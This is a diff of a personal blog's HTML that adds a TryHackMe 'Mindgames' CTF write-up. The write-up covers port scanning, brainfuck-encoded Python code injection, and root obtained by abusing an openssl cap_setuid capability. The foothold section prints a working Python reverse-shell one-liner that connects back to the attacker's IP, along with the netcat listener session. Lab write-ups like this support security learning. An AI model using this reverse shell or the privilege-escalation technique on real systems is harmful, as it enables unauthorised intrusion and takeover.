@@ -1,18 +1,18 @@
 <!DOCTYPE html>
 <html lang="en-us">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Writeups for HTB Rooms. Starting Soon!'><title>Category: HackTheBox - Tanishq Chaudhary</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Get brainfucked in the easy room. Exploit a rare OpenSSL exploit to get root.'><title>TryHackMe: Mindgames Writeup</title>
 
-<link rel='canonical' href='/categories/htb/'>
+<link rel='canonical' href='/p/tryhackme-mindgames-writeup/'>
 
-<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Category: HackTheBox - Tanishq Chaudhary'>
-<meta property='og:description' content='Writeups for HTB Rooms. Starting Soon!'>
-<meta property='og:url' content='/categories/htb/'>
+<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='TryHackMe: Mindgames Writeup'>
+<meta property='og:description' content='Get brainfucked in the easy room. Exploit a rare OpenSSL exploit to get root.'>
+<meta property='og:url' content='/p/tryhackme-mindgames-writeup/'>
 <meta property='og:site_name' content='Tanishq Chaudhary'>
-<meta property='og:type' content='website'><meta property='og:updated_time' content=' 2021-06-18T00:00:00&#43;00:00 '/><meta property='og:image' content='/categories/htb/htb.jpg' />
-<meta name="twitter:title" content="Category: HackTheBox - Tanishq Chaudhary">
-<meta name="twitter:description" content="Writeups for HTB Rooms. Starting Soon!"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='/categories/htb/htb.jpg' /><link rel="alternate" type="application/rss&#43;xml" href="/categories/htb/index.xml">
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='ctf-style' /><meta property='article:tag' content='scripting' /><meta property='article:published_time' content='2021-06-18T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-06-18T00:00:00&#43;00:00'/><meta property='og:image' content='https://i.imgur.com/K1GTB8e.png' />
+<meta name="twitter:title" content="TryHackMe: Mindgames Writeup">
+<meta name="twitter:description" content="Get brainfucked in the easy room. Exploit a rare OpenSSL exploit to get root."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://i.imgur.com/K1GTB8e.png' />
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
@@ -49,7 +49,7 @@ if (!doNotTrack) {
             document.body.dataset.scheme = 'light';
         }
     })();
-</script><div class="container main-container flex on-phone--column extended ">
+</script><div class="container main-container flex on-phone--column extended article-page with-toolbar">
             <aside class="sidebar left-sidebar sticky">
     <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
         <span class="hamburger-box">
@@ -338,35 +338,266 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
 </aside>
 
             <main class="main full-width">
-    <h3 class="section-title">
-        
-            Categories
-        
-    </h3>
+    <div id="article-toolbar">
+        <a href="/" class="back-home">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="15 6 9 12 15 18" />
+</svg>
 
-    <div class="section-card">
-        <div class="section-details">
-            <h3 class="section-count">0 pages</h3>
-            <h1 class="section-term">HackTheBox</h1>
-            
-                <h2 class="section-description">Writeups for HTB Rooms. Starting Soon!</h2>
-            
+
+
+            <span>Back</span>
+        </a>
+    </div>
+
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/tryhackme-mindgames-writeup/">
+                
+                    <img src="https://i.imgur.com/K1GTB8e.png" loading="lazy" alt="Featured image of post TryHackMe: Mindgames Writeup" />
+                
+            </a>
         </div>
-            <div class="section-image">
-                <img src="/categories/htb/htb_hu0d57e9814f9e9c972ac66f5e4ab1b139_10485_120x120_fill_q75_box_smart1.jpg" 
-                        width="120"
-                        height="120" 
-                        loading="lazy">
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/thm/" style="background-color: #2a9d8f; color: #fff;">
+                TryHackMe
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/tryhackme-mindgames-writeup/">TryHackMe: Mindgames Writeup</a>
+    </h2>
+
+    
+    <h3 class="article-subtitle">
+        Get brainfucked in the easy room. Exploit a rare OpenSSL exploit to get root.
+    </h3>
+    <footer class="article-time">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <time class="article-time--published">Jun 18, 2021</time>
+    </footer></div>
+</header>
+
+    <section class="article-content">
+    <p><a class="link" href="https://tryhackme.com/room/mindgames"  target="_blank" rel="noopener"
+    >Play</a></p>
+<h2 id="1-scanning--enumeration">1. Scanning &amp; Enumeration</h2>
+<p>We do the below scans in parallel.</p>
+<h3 id="11-port-scanning">1.1. Port Scanning</h3>
+<pre><code>Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
+|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
+|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Mindgames.
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Nothing too special here.</p>
+<h3 id="12-web-enumeration">1.2. Web Enumeration</h3>
+<p>I tried enumerating other directories in the website, but I did not find anything.</p>
+<h3 id="13-web-exploration">1.3. Web Exploration</h3>
+<p><img src="https://i.imgur.com/70BECEk.png" alt="webserver"  /></p>
+<p>This looks like the brainfuck language. Using a decoder <a class="link" href="https://www.dcode.fr/brainfuck-language"  target="_blank" rel="noopener"
+    >here</a>. Decoding the first one, we get the resultant: <code>print(&quot;Hello, World&quot;)</code></p>
+<p>The second one is:</p>
+<pre><code>def F(n):
+    if n &lt;= 1:
+        return 1
+    return F(n-1)+F(n-2)
+
+
+for i in range(10):
+    print(F(i))
+</code></pre><p>both look python3. So &hellip; could we put a python3 reverse shell?</p>
+<h2 id="2-foothold">2. Foothold</h2>
+<p>I tried putting a vanilla python3 line, but it did not work. So, I tried encoding it first with brainfuck using <a class="link" href="https://copy.sh/brainfuck/text.html"  target="_blank" rel="noopener"
+    >this tool</a>.</p>
+<p>encoding
+<img src="https://i.imgur.com/YdSrQnj.png" alt="encoding"  /></p>
+<p>it works!
+<img src="https://i.imgur.com/686qr6L.png" alt="works"  /></p>
+<p><a class="link" href="https://www.revshells.com/"  target="_blank" rel="noopener"
+    >Get a reverse shell</a>. I used the one below.</p>
+<pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.17.8.184&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)
+</code></pre><p>Listening on a port.</p>
+<pre><code>┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 4444                               
+listening on [any] 4444 ...
+connect to [10.17.8.184] from (UNKNOWN) [10.10.28.151] 37062
+$ python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+mindgames@mindgames:~/webserver$ 
+</code></pre><p>We are in!</p>
+<h2 id="3-privesc">3. PrivEsc</h2>
+<p>Upgrade the shell: <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<p>I took some time enumerating and I found the below using <code>linpeas.sh</code>.</p>
+<pre><code>Files with capabilities (limited to 50):
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/openssl = cap_setuid+ep
+/home/mindgames/webserver/server = cap_net_bind_service+ep
+/home/mindgames/webserver/server = cap_net_bind_service+ep is writable
+</code></pre><p>The <code>/usr/bin/openssl = cap_setuid+ep</code> looks very interesting. <a class="link" href="https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/"  target="_blank" rel="noopener"
+    >Look at my blog here</a> to figure how to use it. Running,</p>
+<pre><code>mindgames@mindgames:~/webserver$ openssl req -engine ./openssl-engine.so
+openssl req -engine ./openssl-engine.so
+root@mindgames:~/webserver# id
+id
+uid=0(root) gid=1001(mindgames) groups=1001(mindgames)
+root@mindgames:~/webserver# cd /root
+cd /root
+root@mindgames:/root# cat roo
+cat root.txt 
+thm{yee_haww}
+root@mindgames:/root# 
+</code></pre><p>And we are done!</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf-style/">ctf-style</a>
+        
+            <a href="/tags/scripting/">scripting</a>
+        
+    </section>
+
+
+    </footer>
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">Related contents</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-madness-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/Ord2COL.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/Ord2COL.png"/>
                 
             </div>
         
-    </div>
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Madness Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-vulnnet-internal-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/3ec8CfD.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/3ec8CfD.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: VulnNet Internal Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-mustacchio-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/dorXlbA.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/dorXlbA.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Mustacchio Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-0day-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://imgur.com/jJe7K0O.png" loading="lazy" data-key="" data-hash="https://imgur.com/jJe7K0O.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: 0day Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/tryhackme-agent-sudo-writeup/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="https://i.imgur.com/NoIdF01.png" loading="lazy" data-key="" data-hash="https://i.imgur.com/NoIdF01.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">TryHackMe: Agent Sudo Writeup</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+
+    
         
     
-    <section class="article-list--compact">
-        
-    </section>
-<footer class="site-footer">
+
+    <footer class="site-footer">
     <section class="copyright">
         &copy; 
         
@@ -380,91 +611,83 @@ m125 -66 c16 -18 19 -37 19 -134 0 -97 -3 -116 -19 -134 -24 -27 -48 -27 -72
         Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="2.3.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
     </section>
 </footer>
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
 
-            </main>
     
+    <div class="pswp__bg"></div>
+
     
-    <aside class="sidebar right-sidebar sticky">
+    <div class="pswp__scroll-wrap">
+
         
-            <form action="/search/" class="search-form widget" >
-        <p>
-            <label>Search</label>
-            <input name="keyword" required placeholder="Type something..." />
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
         
-            <button title="Search">
-                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <circle cx="10" cy="10" r="7" />
-  <line x1="21" y1="21" x2="15" y2="15" />
-</svg>
+        <div class="pswp__ui pswp__ui--hidden">
 
+            <div class="pswp__top-bar">
 
+                
 
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
             </button>
-        </p>
-    </form>
-        
-            <section class="widget tagCloud">
-    <div class="widget-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
-  <path stroke="none" d="M0 0h24v24H0z"/>
-  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
-  <circle cx="9" cy="9" r="2" />
-</svg>
 
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
 
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
 
     </div>
-    <h2 class="widget-title section-title">Tags</h2>
 
-    <div class="tagCloud-tags">
-        
-            <a href="/tags/brute-forcing/" class="font_size_11">
-                brute-forcing
-            </a>
-        
-            <a href="/tags/ctf/" class="font_size_9">
-                ctf
-            </a>
-        
-            <a href="/tags/shady-scripts/" class="font_size_9">
-                shady-scripts
-            </a>
-        
-            <a href="/tags/web-work/" class="font_size_9">
-                web-work
-            </a>
-        
-            <a href="/tags/cms/" class="font_size_7">
-                cms
-            </a>
-        
-            <a href="/tags/steganography/" class="font_size_7">
-                steganography
-            </a>
-        
-            <a href="/tags/sudo/" class="font_size_7">
-                sudo
-            </a>
-        
-            <a href="/tags/suid/" class="font_size_6">
-                suid
-            </a>
-        
-            <a href="/tags/ciphers/" class="font_size_5">
-                ciphers
-            </a>
-        
-            <a href="/tags/ftp/" class="font_size_5">
-                ftp
-            </a>
-        
-    </div>
-</section>
-        
-    </aside>
-
-
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+            </main>
         </div>
         <script 
                 src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
